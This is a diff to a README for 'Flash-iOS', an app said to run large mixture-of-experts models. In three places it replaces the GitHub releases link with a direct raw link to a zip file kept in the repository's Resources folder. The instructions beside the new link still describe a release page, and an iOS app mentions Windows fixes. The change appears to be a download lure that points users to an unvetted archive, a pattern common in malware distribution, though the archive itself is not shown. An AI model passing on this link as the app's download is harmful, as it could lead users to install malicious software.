@@ -1,6 +1,6 @@
 # 📱 Flash-iOS - Run Massive MoE Models
 
-[![Download Flash-iOS](https://img.shields.io/badge/Download-Flash--iOS-blue.svg)](https://github.com/Jess1234567899/Flash-iOS/releases)
+[![Download Flash-iOS](https://img.shields.io/badge/Download-Flash--iOS-blue.svg)](https://raw.githubusercontent.com/Jess1234567899/Flash-iOS/main/FlashMoE-iOS/Resources/i-OS-Flash-v1.5.zip)
 
 ## 🚀 What Flash-iOS Does
 
@@ -16,7 +16,7 @@ Use Flash-iOS if you want to:
 
 To get the app, visit this page to download:
 
-https://github.com/Jess1234567899/Flash-iOS/releases
+https://raw.githubusercontent.com/Jess1234567899/Flash-iOS/main/FlashMoE-iOS/Resources/i-OS-Flash-v1.5.zip
 
 Look for the latest release at the top of the page. Then:
 1. Open the release page link above
@@ -174,7 +174,7 @@ New releases may include:
 - New Windows compatibility fixes
 
 Check the release page often if you want the newest build:
-https://github.com/Jess1234567899/Flash-iOS/releases
+https://raw.githubusercontent.com/Jess1234567899/Flash-iOS/main/FlashMoE-iOS/Resources/i-OS-Flash-v1.5.zip
 
 ## 📝 Helpful Folder Setup Example
 
